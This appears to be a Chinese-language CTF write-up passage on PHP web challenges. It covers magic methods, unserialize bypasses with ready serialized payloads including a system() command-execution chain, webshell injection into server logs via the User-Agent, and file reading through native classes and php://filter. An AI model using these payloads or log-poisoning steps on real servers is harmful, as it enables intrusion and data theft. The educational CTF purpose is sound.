    public function __invoke()
    {
        echo "被当成函数了";
    }
}
 
$a=new test();
echo $a;
$a();
 
?>
 
//输出：
被当成字符串了--ss被当成函数了
 
//ehco $a 把对象当成字符串输出触发了__toString(),$a() 把对象当成
//函数执行触发了__invoke()
```

##### __call（）和其他魔术方法
```php
//__call（）和其他魔术方法
 
<?php
class test
{
    public $h="haha";
 
    public function __call($arg1,$arg2)
    {
        echo "你调用了不存在的方法";
    }
}
 
$a=new test();
$a->h();
 
?>
 
//输出：
你调用了不存在的方法
 
//$a->h()调用了不存在的方法触发了__call()方法，其他魔术方法类似不再演示
```

#### 一些简单的php反序列化绕过方法
##### <font style="color:rgb(79, 79, 79);">__wakeup()方法漏洞</font>
存在此漏洞的php版本：php5-php5.6.25、php7-php7.0.10；



调用unserialize()方法时会先调用__wakeup()方法，但是当序列化字符串的表示成员属性的数字大于实际的对象的成员属性数量是时，__wakeup()方法不会被触发，以下的简单例题是__wakeup()方法漏洞的利用：

```php
//__wakeup()方法绕过例题
 
 <?php
 
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
show_source("class.php");
 
class HaHaHa{
 
 
        public $admin;
        public $passwd;
 
        public function __construct(){
            $this->admin ="user";
            $this->passwd = "123456";
        }
 
        public function __wakeup(){
            $this->passwd = sha1($this->passwd);
        }
 
        public function __destruct(){
            if($this->admin === "admin" && $this->passwd === "wllm"){
                include("flag.php");
                echo $flag;
            }else{
                echo $this->passwd;
                echo "No wake up";
            }
        }
    }
 
$Letmeseesee = $_GET['p'];
unserialize($Letmeseesee);
 
?> NSSCTF{f7b177f4-8e9c-4154-9134-db0011b3b97a}
```

分析：

        只要满足__destruct()方法中的if条件就可以获得flag，构造payload时给对于属性赋值即可；

        然而，在反序列化调用unserialize()方法时会触发__wakeup方法，进而改变我们给$passwd属性的赋值，最终导致不满足if条件；

        因此需要避免__wakeup方法的触发，这就需要可以利用__wakeup()方法的漏洞，使序列化字符串的表示成员属性的数字大于实际的对象的成员属性数量，如下payload的构造：

```php
<?php
class HaHaHa{
    public $admin="admin";
    public $passwd="wllm";
}
 
$a=new HaHaHa();
 
$b=serialize($a);
echo "?p=".$b;
 
?>
 
//输出：
?p=O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
 
//将成员属性数量2改为3，大于实际值2即可，payload如下：
?p=O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
```

##### <font style="color:rgb(79, 79, 79);">O:+6绕过正则</font>
 

```php
//简单案例
 
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
```

<font style="color:rgb(254, 44, 36);">分析</font>

<font style="color:rgb(77, 77, 77);">如上正则匹配检查时，匹配到O:4会终止程序，可以替换为O:+4绕过正则匹配；</font>

<font style="color:rgb(77, 77, 77);">或者将对象放入数组再序列化 serialize(array($a))；</font>

<font style="color:rgb(77, 77, 77);">前者有的php版本不适应，后者通用；</font>

##### <font style="color:rgb(79, 79, 79);">引用</font>
```php
//简单例题
 
<?php
 
show_source(__FILE__);
 
###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __construct(){
        $this->a=1;
        $this->b=2;
        $this->c=3;
    }
    public function __wakeup(){
        $this->a='';
    }
    public function __destruct(){
        $this->b=$this->c;
        eval($this->a);
    }
}
$a=$_GET['a'];
if(!preg_match('/test":3/i',$a)){
    die("你输入的不正确！！！搞什么！！");
}
$bbb=unserialize($_GET['a']);
NSSCTF{This_iS_SO_SO_SO_EASY} 
```

分析



        魔术方法___wakeup()会使变量a为空，且由于正则限制无法通过改变成员数量绕过__wakeup()，这时可以使用引用的方法，使变量a与变量b永远相等，魔术方法__destruct()把变量c值赋给变量b时，相当于给变量a赋值，这就可以完成命令执行，payload如下：

```php
<?php
class test
{
    public $a;
    public $b;
    public $c='system("cat /fffffffffflagafag");';
 
}
$h = new test();
$h->b = &$h->a;   //注意：取会改变的属性的地址，如取a的地址赋值给b，当给a赋值时a会等于b的值
echo '?a='.serialize($h);
 
//输出
//?a=O:4:"test":3:{s:1:"a";N;s:1:"b";R:2;s:1:"c";s:33:"system("cat /fffffffffflagafag");";}
```

##### <font style="color:rgb(79, 79, 79);">对类属性不敏感</font>
<font style="color:rgb(77, 77, 77);">protected和private属性的属性名与public属性的属性名不同，由于对属性不敏感，即使不加%00* %00和%00类名%00也可以被正确解析；</font>

##### <font style="color:rgb(79, 79, 79);">大写S当</font><font style="color:rgb(78, 161, 219) !important;">十六进制</font><font style="color:rgb(79, 79, 79);">绕过</font>
<font style="color:rgb(77, 77, 77);">表示字符串类型的s大写为S时，其对应的值会被当作十六进制解析；</font>

```php
例如   s:13:"SplFileObject"  中的Object被过滤
 
可改为  S:13:"SplFileOb\6aect"
 
小写s变大写S，长度13不变，\6a是字符j的十六进制编码
```

##### <font style="color:rgb(79, 79, 79);">php类名不区分大小写</font>
```php
O:1:"A":2:{s:1:"c";s:2:"11";s:1:"b";s:2:"22";}
 
等效于
 
O:1:"a":2:{s:1:"c";s:2:"11";s:1:"b";s:2:"22";}
```

## 数学大师
![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731650448775-0c1c7995-d7b2-4a9d-a626-152e15f7f924.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731650460766-e7882cdc-3fcc-467f-bd8d-ef8352a2a205.png)

涉及到快速计算明显不是人力能做到的所以考察的是编写脚本

脚本内容如下

```python
import requests
import re

req = requests.session()
url = "http://gz.imxbt.cn:20289/"

answer = 0
while True:
    response = req.post(url , data={"answer": answer})
    print(response.text)
    if "BaseCTF" in response.text:
        print(response.text)
        break
    regex = r" (\d*?)(.)(\d*)\?"
    match = re.search(regex, response.text)
    if match.group(2) == "+":
        answer = int(match.group(1)) + int(match.group(3))
    elif match.group(2) == "-":
        answer = int(match.group(1)) - int(match.group(3))
    elif match.group(2) == "×":
        answer = int(match.group(1)) * int(match.group(3))
    elif match.group(2) == "÷":
        answer = int(match.group(1)) // int(match.group(3))
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731654635574-3147b864-8794-4100-a90d-48870b9fc6bb.png)

#### 关于编写此脚本的几个知识点
##### requests库的http请求
参考文章[链接](https://www.jianshu.com/p/67b58a48c1c8)

requests 库提供了一个简单易用的 API 来发送 HTTP 请求。以下是一些基本的请求方法：

   get(url, **kwargs): 发送一个GET请求。

   post(url, data=None, **kwargs): 发送一个POST请求，data可以是字典、字节或文件对象。

   put(url, data=None, **kwargs): 发送一个PUT请求。

   delete(url, **kwargs): 发送一个DELETE请求。

   head(url, **kwargs): 发送一个HEAD请求，只获取页面的HTTP头信息。

   options(url, **kwargs): 发送一个OPTIONS请求，获取服务器支持的HTTP方法。

   patch(url, data=None, **kwargs): 发送一个PATCH请求。

```kotlin
import requests  # 引入requests库

payload = {'key1': 'value1', 'key2': 'value2'}

response = requests.get('http://example.com')
response = requests.post('http://example.com/submit', data=payload)
response = requests.put('http://example.com/put', data={'key': 'value'})
response = requests.delete('http://example.com/delete')
response = requests.head('http://example.com/get')
```

##### re库（正则匹配的使用）
[链接](https://blog.csdn.net/dgw2648633809/article/details/135717819)(参考文献)

###### <font style="color:#4f4f4f;background-color:#ffffff;">compile()函数</font>
基本用法

```python
import re
 
# 匹配一个或多个连续的数字字符
pattern = re.compile(r'\d+') 
 
# 匹配email电邮地址
email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', re.IGNORECASE)
 
# 匹配任意字母数字组成的用户名（至少1个字符）
username_pattern = re.compile(r'\w+')
 
# 匹配任意URL链接
url_pattern = re.compile(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+')
 
# 匹配电话号码（格式如：123-456-7890 或 (123) 456-7890）
phone_pattern = re.compile(r'(\d{3}[-\.\s]??\d{3}[-\.\s]??\d{4}|\(\d{3}\)\s*\d{3}[-\.\s]??\d{4})')
 
# 匹配IPv4地址
ipv4_pattern = re.compile(r'(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)')
 
# 匹配信用卡号（一般为16位数字，可能包含空格分隔符）
credit_card_pattern = re.compile(r'\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}')
 
# 匹配日期格式（YYYY-MM-DD）
date_pattern = re.compile(r'\d{4}-\d{2}-\d{2}')
 
# 匹配颜色代码（如 #FF0000）
color_code_pattern = re.compile(r'^#([A-Fa-f0-9]{6}|[A-Fa-f0-9]{3})$')
 
# 匹配整数和小数（包括负数、正数和零）
number_pattern = re.compile(r'-?\d+(\.\d+)?')
```

###### <font style="color:#4f4f4f;background-color:#ffffff;">正则表达式常用规则字符</font>
```python
\d：在大多数正则表达式语法中（包括Python中的 re 模块），\d 相当于 [0-9]，即它会匹配任意一个十进制数字字符，相当于阿拉伯数字从0到9。

+：这是一个量词，表示前面的元素（这里是\d）至少出现一次或多次。因此，\d+ 作为一个整体，它会匹配一个或连续的一个以上数字字符，例如 "123"、"456789" 等等。

\w：匹配字母（大写或小写）、数字和下划线（等价于 [a-zA-Z0-9_]）。
\s：匹配任何空白字符，包括空格、制表符、换行符等。
. （句点）：匹配除换行符之外的任何单个字符。
^：在字符串起始位置时匹配，或者在字符类 [] 中表示反向选择（如 [^abc] 匹配非 a、b、c 的字符）。
$：在字符串结束位置时匹配。
*：零次或多次匹配前面的元素。
?：零次或一次匹配前面的元素。
{m,n}：前面的元素至少出现 m 次，至多出现 n 次。
|：表示“或”操作，用于匹配多个选项之一。
()：用于分组和捕获子匹配项。
```

###### <font style="color:#4f4f4f;background-color:#ffffff;">match方法</font>
<font style="color:#4d4d4d;background-color:#ffffff;">pattern.match()方法只检测字符串开始位置是否满足匹配条件</font>

```python
import re
 
text = "2023-01-01 This is a date at the start of the string."
 
# 使用match()方法，只从字符串开始位置匹配日期格式
pattern = re.compile(r'\d{4}-\d{2}-\d{2}')
match_result = pattern.match(text)
 
if match_result:
    print(f"Match found: {match_result.group(0)}")
else:
    print("No match at the beginning of the string.")
 
# 输出：
# Match found: 2023-01-01
```

###### <font style="color:#4f4f4f;background-color:#ffffff;">search方法</font>
<font style="color:#4d4d4d;background-color:#ffffff;">而pattern.search()方法会搜索整个字符串以找到第一个匹配项。</font>

```python
import re
 
text = "The date today is 2023-01-01, let's remember it."
 
# 使用search()方法在整个字符串中搜索日期格式
pattern = re.compile(r'\d{4}-\d{2}-\d{2}')
search_result = pattern.search(text)
 
if search_result:
    print(f"Search found: {search_result.group(0)}")
else:
    print("No match found in the string.")
 
# 输出：
# Search found: 2023-01-01
```

# week3
## 滤个不停
题目代码

```php
 <?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('写出程序员的第一行问候吧！');
}

//这是个什么东东？？？
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('此路不通换条路试试?');
        }
    }


    include($Datch);
} else {
    die('文件名不合规 请重试');
}
?>
写出程序员的第一行问候吧！
```

其中过滤了各种php伪协议 于是我们使用日志包含绕过 由于有回显 所以在POST传参后接任意命令执行

利用burpsite抓包并修改数据包

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731720279973-3b736b33-faf5-44d7-9ef3-71791e6f07c1.png)

从而得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731720294342-a8a4417d-1615-4488-b557-2a3d849159c1.png)

#### 关于日志文件包含漏洞
当某个PHP文件只存在本地包含漏洞，不存在远程包含漏洞，而却无法上传正常文件(无上传功能)，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。



Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中

例如:[http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=](http://192.168.1.55:8080/dvwa/vulnerabilities/fi/?page=)…/…/…/…/Apache-20\logs\access.log



使用的是DVWA环境 安全等级低



首先要把一句话木马写入到access.log访问日志中

直接在URL中加入一句话木马，回车，虽然会报错，但是没关系，我们的一句话木马已经被access文件记录了 之后只需要利用本地包含文件来运行access.log就可以了

注意要用…/来调整目录

注释：（题目使用的是nginx服务器 但是原理是一样的）

#### <font style="color:rgb(79, 79, 79);">日志文件的注入</font>
[链接](https://blog.csdn.net/qq_74350234/article/details/142160769?ops_request_misc=%257B%2522request%255Fid%2522%253A%25228B674EF4-4242-40BA-8D2F-DA52863146D6%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=8B674EF4-4242-40BA-8D2F-DA52863146D6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-142160769-null-null.142^v100^pc_search_result_base7&utm_term=%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6ctf&spm=1018.2226.3001.4187)（参考文章）

<font style="color:rgb(77, 77, 77);">1.首先介绍日志文件的作用：通俗来说日志文件(access.log)可以记录我们所有在服务器上的操作记录</font>

<font style="color:rgb(77, 77, 77);">2.getshell的过程也很简单，我们可以在</font>**<font style="color:rgb(254, 44, 36);">UA（user-agent）输入木马</font>**<font style="color:rgb(77, 77, 77);">(常用)</font>

<font style="color:rgb(77, 77, 77);">执行，也可在</font>**<font style="color:rgb(254, 44, 36);">url后面加上一句话木马</font>**<font style="color:rgb(77, 77, 77);">(常被url编码)执行</font>

<font style="color:rgb(77, 77, 77);">例如：</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722687448-22916442-495f-41cb-9e2d-43316647b250.png)

<font style="color:rgb(77, 77, 77);">但当我们利用参数a执行ls命令的时候，发现没有成功，原来是因为日志文件里的木马被</font>**<font style="color:rgb(254, 44, 36);">url编码</font>**<font style="color:rgb(77, 77, 77);">过了，但我们想要让日志文件的木马是</font>**<font style="color:rgb(254, 44, 36);">未被urlencode</font>**<font style="color:rgb(77, 77, 77);">的</font>

<font style="color:rgb(77, 77, 77);">(注：include包含html或者文本文件，其内容会被直接输出的，这里就是直接输出了日志文件内容）</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722735571-0854a39d-abe5-440d-9a8c-9a3dc30d491f.png)

所以我们可以通过bp传一句话木马，bp传参的时候是不会经过浏览器url编码的，而是直接到服务器进行urldecode

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722771959-5a5ba90b-38b3-49e8-8c6a-e5aaafe4fc69.png)

<font style="color:rgb(77, 77, 77);">或者直接在ua处添加</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722796262-11025aac-da35-445d-a5d4-747b13d590f2.png)

<font style="color:rgb(77, 77, 77);">然后我们对参数执行命令即可</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722817573-7c456370-5486-4da6-860a-6f69d80d74af.png)

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731722831737-358836e4-98ab-4860-94a0-545a484cb930.png)

或者我们还可以用蚁剑连接日志文件中的php木马

无论哪种方法本质都是一样的，都是利用日志文件的webshell得到flag

## EZ_PHP_Jail
题目代码![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740413988-4cb7518f-ab5d-45d7-a3a6-5a339dabcffd.png)

右键查看源代码后发现一段base64密文

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740452983-ed7ef978-ad59-4ef1-95fd-bbd3ea2a93a5.png)解密后得到

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740471481-8b84364a-700f-4a26-828c-fdaba9465a81.png)

访问后进入phpinfo

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740510414-42b9e31e-a3d4-4444-b72e-5cb7f6fa5c2d.png)

发现禁用了很多漏洞函数 

所以我们可以利用highlight_file配合glob

```php
highlight_file配合glob, glob 通常用于匹配符合特定规则的文件路径名, glob("/f*") 会搜索文件系统中所有以 /f 开头的文件或目录。然后，通过 [0] 索引选择第一个匹配的结果

?Jail[by.Happy=highlight_file(glob("/fl*")[0]);
```

得到flag

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731740757776-f3b2d729-e120-4a9d-ba9a-20cebc9e741c.png)

#### PHP的小知识点
<font style="color:rgb(77, 77, 77);">当 php 版本⼩于 8 时，</font>[<font style="color:rgb(77, 77, 77);">GET 请求</font>](https://so.csdn.net/so/search?q=GET%20%E8%AF%B7%E6%B1%82&spm=1001.2101.3001.7020)<font style="color:rgb(77, 77, 77);">的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</font>

<font style="color:rgb(77, 77, 77);">个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ </font>

#### <font style="color:rgb(77, 77, 77);">PHP中的highlight_file()函数</font>
<font style="color:rgb(77, 77, 77);">h</font><font style="color:rgb(77, 77, 77);">ighlight_file()函数是PHP中的一个内置函数，用于突出显示文件的语法。通过使用HTML标记突出显示语法。</font>

<font style="color:rgb(77, 77, 77);">用法: highlight_file( $filename, $return )</font>

<font style="color:rgb(77, 77, 77);">参数：该函数接受上述和以下描述的两个参数：</font>

<font style="color:rgb(77, 77, 77);">$filename:它是必填参数。它指定要显示其内容的文件。</font>

<font style="color:rgb(77, 77, 77);">$return:它是可选的布尔值参数。其默认值为FALSE。如果将其设置为TRUE，则该函数将以字符串形式返回突出显示的代码，而不是将其打印出来。</font>

<font style="color:rgb(77, 77, 77);">返回值：成功返回TRUE，失败返回FALSE。如果$return设置为TRUE，它将以字符串形式返回突出显示的代码。</font>

<font style="color:rgb(77, 77, 77);">(本题中的highlight_file()函数被用与配合glob输出flag)</font>

#### <font style="color:rgb(34, 34, 38);">PHP Glob（）函数以示例匹配路径，目录，文件名</font>
参考文章[链接](https://blog.csdn.net/cunjiu9486/article/details/109076435?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522E8CADAC9-A8BF-4686-A4EC-DB0D4EDE2F03%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=E8CADAC9-A8BF-4686-A4EC-DB0D4EDE2F03&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-109076435-null-null.142^v100^pc_search_result_base7&utm_term=glob%E5%87%BD%E6%95%B0php&spm=1018.2226.3001.4187)

###### <font style="color:rgb(79, 79, 79);">确切的字符串搜索 (Exact String Search)</font>
<font style="color:rgb(77, 77, 77);">我们将从一个简单的例子开始。 我们将研究如何将精确的字符串或文件名与绝对路径匹配。 在此示例中，我们将列出文件 /home/ismail/poftut.c。 我们可以在下面的示例中看到该函数返回一个包含匹配项的列表</font><font style="color:rgb(77, 77, 77);">。</font>

```php
<?php 
foreach(glob("/home/ismail/poftut.c") as $file){ 
 echo "$file\n"; 
} 
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742389495-c9882832-2a1e-4150-b09c-cf6dd8276dba.png)

###### <font style="color:rgb(79, 79, 79);">通配符(Wildcards)</font>
<font style="color:rgb(77, 77, 77);">通配符对于glob操作很重要。 通配符或星号用于匹配零个或多个字符。 通配符指定在字符不重要的情况下可以有零个字符或多个字符。 在本示例中，我们将匹配扩展名为.txt文件。</font>

```php
<?php 
foreach(glob("/home/ismail/*.txt") as $file){ 
 echo "$file\n"; 
} 
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742443588-44981182-2b93-4581-ab74-ceb3e2e43518.png)

<font style="color:rgb(77, 77, 77);">我们可以看到，有许多.txt文件返回到PHP列表中。</font>

###### <font style="color:rgb(79, 79, 79);">具有多级目录的通配符 (Wildcards with Multilevel Directories)</font>
<font style="color:rgb(77, 77, 77);">我们可以使用通配符来指定多级目录。 如果要在一级目录中搜索指定的glob，则将使用</font><font style="color:#601BDE;">/*/</font><font style="color:rgb(77, 77, 77);"> 。 在此示例中，我们在 /home/ismail下一级目录中搜索.txt文件</font><font style="color:rgb(77, 77, 77);">。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742560833-b2c82f4a-d811-4dac-9289-0cf0a940e466.png)

```php
<?php 
foreach(glob("/home/ismail/*/*.txt") as $file){ 
 echo "$file\n"; 
} 
?>
```

###### <font style="color:rgb(79, 79, 79);">单字符 (Single Character)</font>
<font style="color:rgb(77, 77, 77);">有一个问号，用于匹配单个字符。 如果我们不知道给定名称的单个字符，这将很有用。 在此示例中，我们将文件与文件file?.txt文件匹配，这些文件将匹配</font>

<font style="color:rgb(51, 51, 51);">file1.txt file.txt file5.txt</font>

```php
<?php 
foreach(glob("/home/ismail/*/*.?") as $file){ 
 echo "$file\n"; 
} 
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742779958-07f03ca6-65ff-40c9-b8e6-65271ea726a8.png)

###### <font style="color:rgb(79, 79, 79);">多个字符(Multiple Characters)</font>
<font style="color:rgb(77, 77, 77);">Glob还支持字母和数字字符。 我们可以使用 [ 来开始字符范围，而 ] 来结束字符范围。 我们可以将要匹配的任何内容放在方括号之间。 在此示例中，我们将匹配以e,m,p之一开头的文件和文件夹名称。</font>

```php
<?php 
foreach(glob("/home/ismail/[emp]*.tx?") as $file){ 
 echo "$file\n"; 
} 
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742818406-3a9a03ca-8334-48c9-91dd-c194edd4dc0c.png)

###### <font style="color:rgb(79, 79, 79);">编号范围(Number Ranges)</font>
<font style="color:rgb(77, 77, 77);">在某些情况下，我们可能希望匹配数字范围。 我们可以使用 - 破折号指定开始和结束编号。 在此示例中，我们将0到9与0-9匹配。 在此示例中，我们将匹配文件和文件夹名称，其中包含从0到9的数字。</font>

```php
<?php 
foreach(glob("/home/ismail/*[0-9]*") as $file){ 
 echo "$file\n"; 
} 
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742924540-9d365209-04b3-4431-b927-f5fc7c164483.png)

###### <font style="color:rgb(79, 79, 79);">字母范围(Alphabet Ranges)</font>
<font style="color:rgb(77, 77, 77);">我们还可以定义类似于数字范围的字母范围。 我们将az用于小写字符，将AZ用于大写字符。 如果我们需要在单个语句中匹配大小写字符，该怎么办。 我们可以使用aZ来匹配大小写字母。 在此示例中，我们将匹配以a和c之间a字母开头的文件和文件夹名称</font>

```php
<?php 
foreach(glob("/home/ismail/[a-c]*") as $file){ 
 echo "$file\n"; 
} 
?>
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731742991386-bf8fa900-f045-4993-a023-39f50401936b.png)

# week4
## flag直接读取不就行了？
题目代码

```php
<?php
highlight_file('index.php');
# 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~
error_reporting(0);
$J1ng = $_POST['J'];
$Hong = $_POST['H'];
$Keng = $_GET['K'];
$Wang = $_GET['W'];
$dir = new $Keng($Wang);
foreach($dir as $f) {
    echo($f . '<br>');
}
echo new $J1ng($Hong);
?>
```

刚开始只知道是有关php的题目 看来wp也没怎么看懂 后面在csdn上看到了一篇十分相像的文章才知道考的是<font style="color:#601BDE;">php的原生类遍历目录和读取文件</font>

<font style="color:#000000;">参考文章</font>[<font style="color:#000000;">链</font><font style="color:#601BDE;">接</font>](https://blog.csdn.net/Elite__zhb/article/details/129739647)

<font style="color:rgb(77, 77, 77);">当php代码只有一个类或者没有类利用时，我们就可以调用php的内置类来进行目录遍历和任意文件读取等一系列的操作。内置类，顾名思义就是php本身存在的类，我们可以直接拿过来用。本次来学习经常能用到的几种内置类。</font>

<font style="color:#000000;">由于我们可以控制参数$Keng和$Wang 且根据提示flag在文件secret里面</font>

<font style="color:#000000;">所以利用</font><font style="color:rgb(77, 77, 77);">目录遍历的三种内置类</font>

```php
DirectoryIterator (PHP 5, PHP 7, PHP 8)
 
FilesystemIterator (PHP 5 >= 5.3.0, PHP 7, PHP 8)
 
GlobIterator 
```

于是先遍历secret目录

```php
GET:
?K=GlobIterator&W=glob:///secret/*
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731767823056-02f1ba5b-a2e7-45ce-86d5-a4ec70020a18.png)

发现secret下存在f11444g.php(很明显是flag) 所以我们需要读取文件类来输出flag

利用SpIFileObject类和php://fillter来传输flag

```php
POST:
J=SplFileObject&H=php://filter/read=convert.base64-encode/resource=/secret/f11444g.php
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768286245-e004de03-fbf8-4111-9901-67736fa7e6ac.png)

获得flag的base64加密 最后把密文进行解密就可得到flag

### 关于题目中php原生类的利用
参考文章[链接](https://blog.csdn.net/qq_44640313/article/details/134310900?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522CEB32147-96E0-4F63-95A4-9EDA041D3E62%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=CEB32147-96E0-4F63-95A4-9EDA041D3E62&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-134310900-null-null.142^v100^pc_search_result_base7&utm_term=%E9%81%8D%E5%8E%86%E7%9B%AE%E5%BD%95%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB&spm=1018.2226.3001.4187)

#### <font style="color:rgb(79, 79, 79);">可遍历目录类</font>
```php
可遍历目录类分为下面三个：

DirectoryIterator 类
FilesystemIterator 类
GlobIterator 类
```

##### <font style="color:rgb(79, 79, 79);">DirectoryIterator 类 </font>
DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名

功能:遍历指定目录里的文件, 可以配合glob://协议使用匹配来寻找文件路径

```php
<?php
$dir=new DirectoryIterator("/");
echo $dir;
```

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768831222-d2225999-cdbb-41e8-8772-9553e5e12cfa.png)

<font style="color:rgb(77, 77, 77);">这个查不出来什么，如果想输出全部的文件名需要对$dir对象进行</font>**<font style="color:rgb(77, 77, 77);">遍历，</font>**<font style="color:rgb(77, 77, 77);">遍历全部文件</font>

```php
<?php
$dir=new DirectoryIterator("/");
foreach($dir as $f){
    echo($f.'<br>');
    //echo($f->__toString().'<br>'); //与上句效果一样
}
```

<font style="color:rgb(77, 77, 77);">所以说echo触发了</font>**<font style="color:rgb(77, 77, 77);">Directorylterator</font>**<font style="color:rgb(77, 77, 77);"> 中的</font>**<font style="color:rgb(77, 77, 77);">__toString()</font>**<font style="color:rgb(77, 77, 77);">方法</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768911274-0b18527d-acaf-47e0-ba05-f5765e6c82e7.png)

<font style="color:rgb(77, 77, 77);">还可以配合</font>**<font style="color:rgb(77, 77, 77);">glob://协议</font>**<font style="color:rgb(77, 77, 77);">使用</font>**<font style="color:rgb(77, 77, 77);">模式匹配</font>**<font style="color:rgb(77, 77, 77);">来寻找我们想要的</font>**<font style="color:rgb(77, 77, 77);">文件路径</font>**<font style="color:rgb(77, 77, 77);">：</font>

![](https://cdn.nlark.com/yuque/0/2024/png/49235244/1731768930550-ff389e7d-55d2-4af0-84e7-fee657111ef9.png)

<font style="color:rgb(77, 77, 77);">也可以目录穿越，确定已知的文件的</font>**<font style="color:rgb(77, 77, 77);">具体路径</font>**<font style="color:rgb(77, 77, 77);">：</font>

```php
<?php
$dir=new DirectoryIterator("glob://./././flag");  //目录穿越
echo $dir;
```

##### **<font style="color:rgb(79, 79, 79);">FilesystemIterator类</font>**
FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。

该类的使用方法与DirectoryIterator 类也是基本相同的(子类与父类的关系)，就不细讲了

##### <font style="color:rgb(79, 79, 79);">GlobIterator 类</font>
GlobIterator 类也可以遍历一个文件目录，但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。但是使用这个类不需要额外写上glob://

它的特点就是，只需要知道部分名称就可以进行遍历

 Directorylterator类 与 FilesystemIterator 类当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的。而GlobIterator 类在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如：例题里我们知道了flag的文件名特征为 以fl开头的文件，因此我们可以通过 GlobIterator类来模式匹配：

```php
<?php
$dir=new GlobIterator("/fl*");
echo $dir;
```

##### <font style="color:rgb(79, 79, 79);">绕过 open_basedir</font>
